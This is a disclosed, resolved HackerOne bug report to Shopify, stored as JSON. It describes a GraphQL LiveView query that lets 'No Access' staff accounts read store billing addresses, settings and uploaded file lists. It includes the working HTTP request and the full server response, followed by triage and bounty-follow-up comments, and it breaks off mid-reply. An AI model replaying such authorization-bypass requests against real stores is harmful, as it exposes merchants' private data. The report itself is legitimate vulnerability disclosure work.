{"id":409973,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MDk5NzM=","url":"https://hackerone.com/reports/409973","title":"Some store settings/data are accessible to \"No Access\" permission users on GraphQL LiveView operation","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2018-09-15T02:34:26.791Z","submitted_at":"2018-09-15T02:34:26.791Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"tolo7010","url":"/tolo7010","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/137/533/339f440fdc61b6dfeb663c8216d249618b8fd451_original.gif/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1382,"url":"https://hackerone.com/shopify","handle":"shopify","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Shopify","twitter_handle":"","website":"https://www.shopify.com","about":"Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-08-18T22:09:31.031Z","bug_reporter_agreed_on_going_public_at":"2020-08-18T22:09:30.915Z","team_member_agreed_on_going_public_at":"2020-08-18T19:47:01.347Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary\n\nGraphQL LiveView operation doesn't properly check for permissions before returning data. This allows \"No Access\"  users to access some store settings and data by providing complete Shop schema fields in the request string.\n\n## Steps to reproduce\n\n1. Log into an attacker account of a test store that has no any access permissions (\"No Access\"), e.g: `attacker1` on `h1teststore2.myshopify.com`.\n2. Direct request to the following endpoint, the server will return store basic billing address, various store settings, uploaded product images with URL locations and product IDs, and the list of uploaded files of the store:\n\nRequest:\n\n```\nPOST /admin/api/graphql HTTP/1.1\nHost: h1teststore2.myshopify.com\nConnection: close\nContent-Length: 1554\naccept: application/json\nOrigin: null\nX-Shopify-Web-Force-Proxy: 1\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36\ncontent-type: application/json\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9,th;q=0.8,lo;q=0.7\nCookie: ...\n\n{\"operationName\":\"LiveView\",\"variables\":{},\"query\":\"query LiveView {\\n shop {\\n id, billingAddress {\\n address1, address2, city, company, country, firstName, lastName, latitude, longitude, name, phone, province, zip, __typename}\\n, checkoutApiSupported, countriesInShippingZones {\\n countryCodes, includeRestOfWorld}\\n, currencyCode, customerAccounts, description, email, features {\\n branding, captcha, captchaExternalDomains, dynamicRemarketing, giftCards, harmonizedSystemCode, liveView, multiLocation, onboardingVisual, reports, showMetrics, storefront, __typename}\\n, __typename, ianaTimezone, myshopifyDomain, name, navigationSettings {\\n id, title, url}\\n, paymentSettings {\\n supportedDigitalWallets}\\n, plan {\\n displayName, partnerDevelopment, shopifyPlus}\\n, primaryDomain {\\n host, id, sslEnabled, url}\\n, publicationCount, resourceLimits {\\n maxProductOptions, maxProductVariants, redirectLimitReached, skuResourceLimits {\\n available, quantityAvailable, quantityLimit, quantityUsed}\\n}\\n, richTextEditorUrl, searchFilters {\\n productAvailability {\\n label, value}\\n}\\n, setupRequired, shipsToCountries, shopifyPaymentsAccount {\\n balance {\\n amount, currencyCode}\\n, id}\\n, taxShipping, taxesIncluded, timezoneOffset, timezoneOffsetMinutes, url, weightUnit, productImages(first:0) {\\n edges {\\n node {\\n id, originalSrc, altText}\\n}\\n}\\n, search(first:0, query: \\\"p\\\") {\\n edges {\\n cursor, node {\\n description }\\n}\\n, resultsAfterCount}      uploadedImages(first:0) {\\n edges {\\n cursor, node {\\n altText, id, originalSrc }\\n}\\n} }\\n}\\n\"}\n```\n\nResponse:\n\n```\nHTTP/1.1 200 OK\nServer: nginx\nDate: Sat, 15 Sep 2018 02:29:03 GMT\nContent-Type: application/json; charset=utf-8\nContent-Length: 8754\nConnection: close\nX-Sorting-Hat-PodId: 21\nX-Sorting-Hat-PodId-Cached: 0\nX-Sorting-Hat-ShopId: 1472954390\nX-Sorting-Hat-PrivacyLevel: default\nX-Sorting-Hat-FeatureSet: default\nX-Sorting-Hat-Section: pod\nX-Sorting-Hat-ShopId-Cached: 0\ncontent-security-policy: default-src 'self' data: blob: 'unsafe-inline' 'unsafe-eval' https://* shopify-pos://*; block-all-mixed-content; child-src 'self' https://* shopify-pos://*; connect-src 'self' wss://* https://*; frame-ancestors 'none'; script-src https://cdn.shopify.com https://checkout.shopifycs.com https://js-agent.newrelic.com https://bam.nr-data.net https://dme0ih8comzn4.cloudfront.net https://api.stripe.com https://mpsnare.iesnare.com https://appcenter.intuit.com https://www.paypal.com https://maps.googleapis.com https://stats.g.doubleclick.net https://www.google-analytics.com https://v.shopify.com https://widget.intercom.io https://js.intercomcdn.com 'self' 'unsafe-inline' 'unsafe-eval'; upgrade-insecure-requests; report-uri /csp-report?source%5Baction%5D=query\u0026source%5Bapp%5D=Shopify\u0026source%5Bcontroller%5D=admin%2Fgraphql\u0026source%5Bsection%5D=admin_api\u0026source%5Buuid%5D=6ed70c38-5739-4999-810f-fc2171ec530d\nx-xss-protection: 1; mode=block; report=/xss-report?source%5Baction%5D=query\u0026source%5Bapp%5D=Shopify\u0026source%5Bcontroller%5D=admin%2Fgraphql\u0026source%5Bsection%5D=admin_api\u0026source%5Buuid%5D=6ed70c38-5739-4999-810f-fc2171ec530d\nX-Frame-Options: DENY\nx-download-options: noopen\nx-content-type-options: nosniff, nosniff\nstrict-transport-security: max-age=63072000; includeSubDomains; preload\nreferrer-policy: origin-when-cross-origin\nvary: Accept-Encoding\nSet-Cookie: X-Shopify-Access-Token=; path=/admin; expires=Thu, 01 Jan 1970 00:00:00 GMT; secure; httponly\nCache-Control: no-cache,no-store,must-revalidate,max-age=0\nx-shopid: 1472954390\nx-shardid: 21\nx-stats-userid: 23136665622\nx-stats-apiclientid: 1830279\nx-stats-apipermissionid: 75287658518\nserver-timing: socket_queue;dur=0, edge;dur=10, processing;dur=613, util;dur=0.3125\nx-permitted-cross-domain-policies: none\nx-dc: chi2,chi2,gcp-us-central1,gke\nX-Request-ID: 6ed70c38-5739-4999-810f-fc2171ec530d\nSet-Cookie: X-Shopify-Access-Token.sig=IlV0-Jc8m2C_RkbQ2MNKkjCfsq4; path=/admin; expires=Thu, 01 Jan 1970 00:00:00 GMT; secure; httponly\nX-Content-Type-Options: nosniff\n\n{\n  \"data\": {\n    \"shop\": {\n      \"id\": \"gid://shopify/Shop/1472954390\",\n      \"billingAddress\": {\n        \"address1\": \"250 Saint Joseph St\",\n        \"address2\": \"hhhhhhhhh\",\n        \"city\": \"Mobile\",\n        \"company\": \"l1\",\n        \"country\": \"United States\",\n        \"firstName\": null,\n        \"lastName\": null,\n        \"latitude\": 30.6967006,\n        \"longitude\": -88.04352519999999,\n        \"name\": \"\",\n        \"phone\": \"1234567890\",\n        \"province\": \"Alabama\",\n        \"zip\": \"36601\",\n        \"__typename\": \"MailingAddress\"\n      },\n      \"checkoutApiSupported\": true,\n      \"countriesInShippingZones\": {\n        \"countryCodes\": [\n          \"LA\"\n        ],\n        \"includeRestOfWorld\": true\n      },\n      \"currencyCode\": \"USD\",\n      \"customerAccounts\": \"DISABLED\",\n      \"description\": \"\",\n      \"email\": \"tolo7010+1@wearehackerone.com\",\n      \"features\": {\n        \"branding\": \"SHOPIFY\",\n        \"captcha\": true,\n        \"captchaExternalDomains\": false,\n        \"dynamicRemarketing\": false,\n        \"giftCards\": true,\n        \"harmonizedSystemCode\": false,\n        \"liveView\": true,\n        \"multiLocation\": false,\n        \"onboardingVisual\": true,\n        \"reports\": true,\n        \"showMetrics\": true,\n        \"storefront\": true,\n        \"__typename\": \"ShopFeatures\"\n      },\n      \"__typename\": \"Shop\",\n      \"ianaTimezone\": \"Etc/GMT+12\",\n      \"myshopifyDomain\": \"h1teststore2.myshopify.com\",\n      \"name\": \"h1teststore2\",\n      \"navigationSettings\": [\n        {\n          \"id\": \"general\",\n          \"title\": \"General\",\n          \"url\": \"https://h1teststore2.myshopify.com/admin/settings/general\"\n        },\n        {\n          \"id\": \"payments\",\n          \"title\": \"Payments\",\n          \"url\": \"https://h1teststore2.myshopify.com/admin/settings/payments\"\n        },\n        {\n          \"id\": \"checkout\",\n          \"title\": \"Checkout\",\n          \"url\": \"https://h1teststore2.myshopify.com/admin/settings/checkout\"\n        },\n        {\n          \"id\": \"shipping\",\n          \"title\": \"Shipping\",\n          \"url\": \"https://h1teststore2.myshopify.com/admin/settings/shipping\"\n        },\n        {\n          \"id\": \"taxes\",\n          \"title\": \"Taxes\",\n          \"url\": \"https://h1teststore2.myshopify.com/admin/settings/taxes\"\n        },\n        {\n          \"id\": \"notifications\",\n          \"title\": \"Notifications\",\n          \"url\": \"https://h1teststore2.myshopify.com/admin/settings/notifications\"\n        },\n        {\n          \"id\": \"gift_cards\",\n          \"title\": \"Gift cards\",\n          \"url\": \"https://h1teststore2.myshopify.com/admin/settings/gift_cards\"\n        },\n        {\n          \"id\": \"files\",\n          \"title\": \"Files\",\n          \"url\": \"https://h1teststore2.myshopify.com/admin/settings/files\"\n        },\n        {\n          \"id\": \"channels\",\n          \"title\": \"Sales channels\",\n          \"url\": \"https://h1teststore2.myshopify.com/admin/settings/channels\"\n        },\n        {\n          \"id\": \"plan\",\n          \"title\": \"Account\",\n          \"url\": \"https://h1teststore2.myshopify.com/admin/settings/account\"\n        }\n      ],\n      \"paymentSettings\": {\n        \"supportedDigitalWallets\": [\n          \"SHOPIFY_PAY\",\n          \"APPLE_PAY\",\n          \"GOOGLE_PAY\"\n        ]\n      },\n      \"plan\": {\n        \"displayName\": \"affiliate\",\n        \"partnerDevelopment\": true,\n        \"shopifyPlus\": false\n      },\n      \"primaryDomain\": {\n        \"host\": \"h1teststore2.myshopify.com\",\n        \"id\": \"gid://shopify/Domain/26404257814\",\n        \"sslEnabled\": true,\n        \"url\": \"https://h1teststore2.myshopify.com\"\n      },\n      \"publicationCount\": 2,\n      \"resourceLimits\": {\n        \"maxProductOptions\": 3,\n        \"maxProductVariants\": 100,\n        \"redirectLimitReached\": false,\n        \"skuResourceLimits\": {\n          \"available\": true,\n          \"quantityAvailable\": null,\n          \"quantityLimit\": null,\n          \"quantityUsed\": null\n        }\n      },\n      \"richTextEditorUrl\": \"https://cdn.shopify.com/s/assets/mobile_app/rte-1ad5a0b3a8d829251067e35dd78f1d2a6e80b76ce1f7c8e26f42fded4f007ba2.html\",\n      \"searchFilters\": {\n        \"productAvailability\": [\n          {\n            \"label\": \"available on Buy Button\",\n            \"value\": \"buy_button:visible\"\n          },\n          {\n            \"label\": \"unavailable on Buy Button\",\n            \"value\": \"buy_button:hidden\"\n          },\n          {\n            \"label\": \"available on Online Store\",\n            \"value\": \"online_store:visible\"\n          },\n          {\n            \"label\": \"unavailable on Online Store\",\n            \"value\": \"online_store:hidden\"\n          }\n        ]\n      },\n      \"setupRequired\": false,\n      \"shipsToCountries\": [\n        \"AD\",\n        \"AE\",\n        \"AF\",\n        \"AG\",\n        \"AI\",\n        \"AL\",\n        \"AM\",\n        \"AN\",\n        \"AO\",\n        \"AR\",\n        \"AT\",\n        \"AU\",\n        \"AW\",\n        \"AX\",\n        \"AZ\",\n        \"BA\",\n        \"BB\",\n        \"BD\",\n        \"BE\",\n        \"BF\",\n        \"BG\",\n        \"BH\",\n        \"BI\",\n        \"BJ\",\n        \"BL\",\n        \"BM\",\n        \"BN\",\n        \"BO\",\n        \"BQ\",\n        \"BR\",\n        \"BS\",\n        \"BT\",\n        \"BV\",\n        \"BW\",\n        \"BY\",\n        \"BZ\",\n        \"CA\",\n        \"CC\",\n        \"CD\",\n        \"CF\",\n        \"CG\",\n        \"CH\",\n        \"CI\",\n        \"CK\",\n        \"CL\",\n        \"CM\",\n        \"CN\",\n        \"CO\",\n        \"CR\",\n        \"CU\",\n        \"CV\",\n        \"CW\",\n        \"CX\",\n        \"CY\",\n        \"CZ\",\n        \"DE\",\n        \"DJ\",\n        \"DK\",\n        \"DM\",\n        \"DO\",\n        \"DZ\",\n        \"EC\",\n        \"EE\",\n        \"EG\",\n        \"EH\",\n        \"ER\",\n        \"ES\",\n        \"ET\",\n        \"FI\",\n        \"FJ\",\n        \"FK\",\n        \"FO\",\n        \"FR\",\n        \"GA\",\n        \"GB\",\n        \"GD\",\n        \"GE\",\n        \"GF\",\n        \"GG\",\n        \"GH\",\n        \"GI\",\n        \"GL\",\n        \"GM\",\n        \"GN\",\n        \"GP\",\n        \"GQ\",\n        \"GR\",\n        \"GS\",\n        \"GT\",\n        \"GW\",\n        \"GY\",\n        \"HK\",\n        \"HM\",\n        \"HN\",\n        \"HR\",\n        \"HT\",\n        \"HU\",\n        \"ID\",\n        \"IE\",\n        \"IL\",\n        \"IM\",\n        \"IN\",\n        \"IO\",\n        \"IQ\",\n        \"IR\",\n        \"IS\",\n        \"IT\",\n        \"JE\",\n        \"JM\",\n        \"JO\",\n        \"JP\",\n        \"KE\",\n        \"KG\",\n        \"KH\",\n        \"KI\",\n        \"KM\",\n        \"KN\",\n        \"KP\",\n        \"KR\",\n        \"KW\",\n        \"KY\",\n        \"KZ\",\n        \"LA\",\n        \"LB\",\n        \"LC\",\n        \"LI\",\n        \"LK\",\n        \"LR\",\n        \"LS\",\n        \"LT\",\n        \"LU\",\n        \"LV\",\n        \"LY\",\n        \"MA\",\n        \"MC\",\n        \"MD\",\n        \"ME\",\n        \"MF\",\n        \"MG\",\n        \"MK\",\n        \"ML\",\n        \"MM\",\n        \"MN\",\n        \"MO\",\n        \"MQ\",\n        \"MR\",\n        \"MS\",\n        \"MT\",\n        \"MU\",\n        \"MV\",\n        \"MW\",\n        \"MX\",\n        \"MY\",\n        \"MZ\",\n        \"NA\",\n        \"NC\",\n        \"NE\",\n        \"NF\",\n        \"NG\",\n        \"NI\",\n        \"NL\",\n        \"NO\",\n        \"NP\",\n        \"NR\",\n        \"NU\",\n        \"NZ\",\n        \"OM\",\n        \"PA\",\n        \"PE\",\n        \"PF\",\n        \"PG\",\n        \"PH\",\n        \"PK\",\n        \"PL\",\n        \"PM\",\n        \"PN\",\n        \"PS\",\n        \"PT\",\n        \"PY\",\n        \"QA\",\n        \"RE\",\n        \"RO\",\n        \"RS\",\n        \"RU\",\n        \"RW\",\n        \"SA\",\n        \"SB\",\n        \"SC\",\n        \"SD\",\n        \"SE\",\n        \"SG\",\n        \"SH\",\n        \"SI\",\n        \"SJ\",\n        \"SK\",\n        \"SL\",\n        \"SM\",\n        \"SN\",\n        \"SO\",\n        \"SR\",\n        \"SS\",\n        \"ST\",\n        \"SV\",\n        \"SX\",\n        \"SY\",\n        \"SZ\",\n        \"TC\",\n        \"TD\",\n        \"TF\",\n        \"TG\",\n        \"TH\",\n        \"TJ\",\n        \"TK\",\n        \"TL\",\n        \"TM\",\n        \"TN\",\n        \"TO\",\n        \"TR\",\n        \"TT\",\n        \"TV\",\n        \"TW\",\n        \"TZ\",\n        \"UA\",\n        \"UG\",\n        \"UM\",\n        \"US\",\n        \"UY\",\n        \"UZ\",\n        \"VA\",\n        \"VC\",\n        \"VE\",\n        \"VG\",\n        \"VN\",\n        \"VU\",\n        \"WF\",\n        \"WS\",\n        \"XK\",\n        \"YE\",\n        \"YT\",\n        \"ZA\",\n        \"ZM\",\n        \"ZW\"\n      ],\n      \"shopifyPaymentsAccount\": {\n        \"balance\": [],\n        \"id\": \"gid://shopify/ShopifyPaymentsAccount/7381516310\"\n      },\n      \"taxShipping\": false,\n      \"taxesIncluded\": false,\n      \"timezoneOffset\": \"-1200\",\n      \"timezoneOffsetMinutes\": -720,\n      \"url\": \"https://h1teststore2.myshopify.com\",\n      \"weightUnit\": \"OUNCES\",\n      \"productImages\": {\n        \"edges\": [\n          {\n            \"node\": {\n              \"id\": \"gid://shopify/ProductImage/4355938058262\",\n              \"originalSrc\": \"https://cdn.shopify.com/s/files/1/0014/7295/4390/products/e38bd83af578077b65a31424bd24d085.png?v=1536708119\",\n              \"altText\": null\n            }\n          },\n          {\n            \"node\": {\n              \"id\": \"gid://shopify/ProductImage/4357656707094\",\n              \"originalSrc\": \"https://cdn.shopify.com/s/files/1/0014/7295/4390/products/MetroUI-Apps-Minecraft-icon.png?v=1536974005\",\n              \"altText\": \"testalt\"\n            }\n          }\n        ]\n      },\n      \"search\": {\n        \"edges\": [],\n        \"resultsAfterCount\": 0\n      },\n      \"uploadedImages\": {\n        \"edges\": [\n          {\n            \"cursor\": \"eyJsYXN0X2lkIjoxNTU3NjI4ODQ2MzAsImxhc3RfdmFsdWUiOiIyMDE4LTA5LTA5IDA0OjQ2OjE5In0=\",\n            \"node\": {\n              \"altText\": null,\n              \"id\": \"gid://shopify/ShopImage/155762884630\",\n              \"originalSrc\": \"https://cdn.shopify.com/s/files/1/0014/7295/4390/files/mobile-receipt-shopify.png?v=1536468379\"\n            }\n          },\n          {\n            \"cursor\": \"eyJsYXN0X2lkIjoxNTU3NjI5MTczOTgsImxhc3RfdmFsdWUiOiIyMDE4LTA5LTA5IDA0OjQ2OjE5In0=\",\n            \"node\": {\n              \"altText\": null,\n              \"id\": \"gid://shopify/ShopImage/155762917398\",\n              \"originalSrc\": \"https://cdn.shopify.com/s/files/1/0014/7295/4390/files/mobile-receipt-amex.png?v=1536468379\"\n            }\n          },\n          {\n            \"cursor\": \"eyJsYXN0X2lkIjoxNTU3NjI5NTAxNjYsImxhc3RfdmFsdWUiOiIyMDE4LTA5LTA5IDA0OjQ2OjIwIn0=\",\n            \"node\": {\n              \"altText\": null,\n              \"id\": \"gid://shopify/ShopImage/155762950166\",\n              \"originalSrc\": \"https://cdn.shopify.com/s/files/1/0014/7295/4390/files/mobile-receipt-cash.png?v=1536468380\"\n            }\n          },\n          {\n            \"cursor\": \"eyJsYXN0X2lkIjoxNTU3NjI5ODI5MzQsImxhc3RfdmFsdWUiOiIyMDE4LTA5LTA5IDA0OjQ2OjIwIn0=\",\n            \"node\": {\n              \"altText\": null,\n              \"id\": \"gid://shopify/ShopImage/155762982934\",\n              \"originalSrc\": \"https://cdn.shopify.com/s/files/1/0014/7295/4390/files/mobile-receipt-customesale-icon.png?v=1536468380\"\n            }\n          },\n          {\n            \"cursor\": \"eyJsYXN0X2lkIjoxNTU3NjMwMTU3MDIsImxhc3RfdmFsdWUiOiIyMDE4LTA5LTA5IDA0OjQ2OjIwIn0=\",\n            \"node\": {\n              \"altText\": null,\n              \"id\": \"gid://shopify/ShopImage/155763015702\",\n              \"originalSrc\": \"https://cdn.shopify.com/s/files/1/0014/7295/4390/files/mobile-receipt-debit.png?v=1536468380\"\n            }\n          },\n          {\n            \"cursor\": \"eyJsYXN0X2lkIjoxNTU3NjMwNDg0NzAsImxhc3RfdmFsdWUiOiIyMDE4LTA5LTA5IDA0OjQ2OjIwIn0=\",\n            \"node\": {\n              \"altText\": null,\n              \"id\": \"gid://shopify/ShopImage/155763048470\",\n              \"originalSrc\": \"https://cdn.shopify.com/s/files/1/0014/7295/4390/files/mobile-receipt-diners.png?v=1536468380\"\n            }\n          },\n          {\n            \"cursor\": \"eyJsYXN0X2lkIjoxNTU3NjMwODEyMzgsImxhc3RfdmFsdWUiOiIyMDE4LTA5LTA5IDA0OjQ2OjIwIn0=\",\n            \"node\": {\n              \"altText\": null,\n              \"id\": \"gid://shopify/ShopImage/155763081238\",\n              \"originalSrc\": \"https://cdn.shopify.com/s/files/1/0014/7295/4390/files/mobile-receipt-discover.png?v=1536468380\"\n            }\n          },\n          {\n            \"cursor\": \"eyJsYXN0X2lkIjoxNTU3NjMxMTQwMDYsImxhc3RfdmFsdWUiOiIyMDE4LTA5LTA5IDA0OjQ2OjIxIn0=\",\n            \"node\": {\n              \"altText\": null,\n              \"id\": \"gid://shopify/ShopImage/155763114006\",\n              \"originalSrc\": \"https://cdn.shopify.com/s/files/1/0014/7295/4390/files/mobile-receipt-giftcard.png?v=1536468381\"\n            }\n          },\n          {\n            \"cursor\": \"eyJsYXN0X2lkIjoxNTU3NjMxNDY3NzQsImxhc3RfdmFsdWUiOiIyMDE4LTA5LTA5IDA0OjQ2OjIxIn0=\",\n            \"node\": {\n              \"altText\": null,\n              \"id\": \"gid://shopify/ShopImage/155763146774\",\n              \"originalSrc\": \"https://cdn.shopify.com/s/files/1/0014/7295/4390/files/mobile-receipt-mastercard.png?v=1536468381\"\n            }\n          },\n          {\n            \"cursor\": \"eyJsYXN0X2lkIjoxNTU3NjMxNzk1NDIsImxhc3RfdmFsdWUiOiIyMDE4LTA5LTA5IDA0OjQ2OjIxIn0=\",\n            \"node\": {\n              \"altText\": null,\n              \"id\": \"gid://shopify/ShopImage/155763179542\",\n              \"originalSrc\": \"https://cdn.shopify.com/s/files/1/0014/7295/4390/files/mobile-receipt-storecredit.png?v=1536468381\"\n            }\n          },\n          {\n            \"cursor\": \"eyJsYXN0X2lkIjoxNTU3NjMyMTIzMTAsImxhc3RfdmFsdWUiOiIyMDE4LTA5LTA5IDA0OjQ2OjIxIn0=\",\n            \"node\": {\n              \"altText\": null,\n              \"id\": \"gid://shopify/ShopImage/155763212310\",\n              \"originalSrc\": \"https://cdn.shopify.com/s/files/1/0014/7295/4390/files/mobile-receipt-visa.png?v=1536468381\"\n            }\n          },\n          {\n            \"cursor\": \"eyJsYXN0X2lkIjoxNTU3OTc3NDk3ODIsImxhc3RfdmFsdWUiOiIyMDE4LTA5LTE1IDAxOjI3OjAwIn0=\",\n            \"node\": {\n              \"altText\": null,\n              \"id\": \"gid://shopify/ShopImage/155797749782\",\n              \"originalSrc\": \"https://cdn.shopify.com/s/files/1/0014/7295/4390/files/Koala.jpg?v=1536974820\"\n            }\n          }\n        ]\n      }\n    }\n  },\n  \"extensions\": {\n    \"cost\": {\n      \"requestedQueryCost\": 20,\n      \"actualQueryCost\": 35,\n      \"throttleStatus\": {\n        \"maximumAvailable\": 5000.0,\n        \"currentlyAvailable\": 4965,\n        \"restoreRate\": 250.0\n      }\n    }\n  }\n}\n```\n\n## Impact\n\nUsers without any access permissions can access many store information, for example: store basic billing address, settings, uploaded product images  and list of uploaded files.","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":18,"name":"Information Disclosure"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":2,"voters":["drsniper","sa1tama0"],"structured_scope":{"databaseId":413,"asset_type":"URL","asset_identifier":"your-store.myshopify.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":3340773,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"## Additional note 1\n\nThe `OverviewDashboard` operation is also available and can be reproduced as the same steps and parameters (just by changing `LiveView` strings)","automated_response":false,"created_at":"2018-09-15T06:36:16.823Z","updated_at":"2018-09-15T06:36:16.823Z","actor":{"username":"tolo7010","cleared":true,"url":"/tolo7010","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/137/533/339f440fdc61b6dfeb663c8216d249618b8fd451_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3355087,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @tolo7010. Thanks for your patience.\n\nWe have reproduced your report; our engineering team is investigating.\n\nSome access to shop information is available to all staff accounts, such as through /admin/shop.json. This is intentional. We are currently investigating whether this is the case for the image URLs returned in this response.","automated_response":false,"created_at":"2018-09-18T19:24:18.997Z","updated_at":"2018-09-18T19:24:18.997Z","actor":{"username":"thisisfine_coffee","cleared":false,"url":"/thisisfine_coffee","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/166/251/8ce19cedb0a26b34bf6375b2e505d1882b076e88_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3358748,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks again for your report! Our engineering team is investigating this issue. Please note that this may not be eligible for a bounty, since the majority of the information available here is intentionally available to all staff accounts.","automated_response":false,"created_at":"2018-09-19T14:52:30.051Z","updated_at":"2018-09-19T14:52:30.051Z","actor":{"username":"thisisfine_coffee","cleared":false,"url":"/thisisfine_coffee","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/166/251/8ce19cedb0a26b34bf6375b2e505d1882b076e88_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3462867,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi team,\n\nThis submission seems a bit delayed, could you give me an update or the possible resolve date on this report? and please let me know if you need more information. Thank you.\n\nRegards,\ntolo7010","automated_response":false,"created_at":"2018-10-10T22:49:09.097Z","updated_at":"2018-10-10T22:49:09.097Z","actor":{"username":"tolo7010","cleared":true,"url":"/tolo7010","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/137/533/339f440fdc61b6dfeb663c8216d249618b8fd451_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3464983,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"There is no update at this time. We will contact you as soon as we have more to add. Thank you for your patience.","automated_response":false,"created_at":"2018-10-11T12:27:17.964Z","updated_at":"2018-10-11T12:27:17.964Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3590671,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi team,\n\nI need your help. This is an unusual situation, I am preparing for my marriage which will be held on next January, and I need some amount of money for the preparation. Could you please provide me the possible resolution date for this report? If it would take more than two months, I would like to request you a pre-bounty award (if eligible) - some initial bounty amount would be appreciated. \n\nThank you for considering and please let me know if you need more information.\n\nRegards,\ntolo7010","automated_response":false,"created_at":"2018-11-06T00:12:24.154Z","updated_at":"2018-11-06T00:12:24.154Z","actor":{"username":"tolo7010","cleared":true,"url":"/tolo7010","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/137/533/339f440fdc61b6dfeb663c8216d249618b8fd451_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3590882,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@tolo7010 As usual, we will pay out a final bounty amount (if any) for this report as soon as it is resolved. We will be in touch with you as soon as that happens.","automated_response":false,"created_at":"2018-11-06T01:11:08.931Z","updated_at":"2018-11-06T01:11:08.931Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":3688557,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello team, could you please give me an update on this report or the possibly fix date? thanks.","automated_response":false,"created_at":"2018-11-21T01:06:48.917Z","updated_at":"2018-11-21T01:06:48.917Z","actor":{"username":"tolo7010","cleared":true,"url":"/tolo7010","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/137/533/339f440fdc61b6dfeb663c8216d249618b8fd451_original.gif/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":3697947,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@tolo7010 We are continuing to work on this, and will give you an update as soon as the issue is 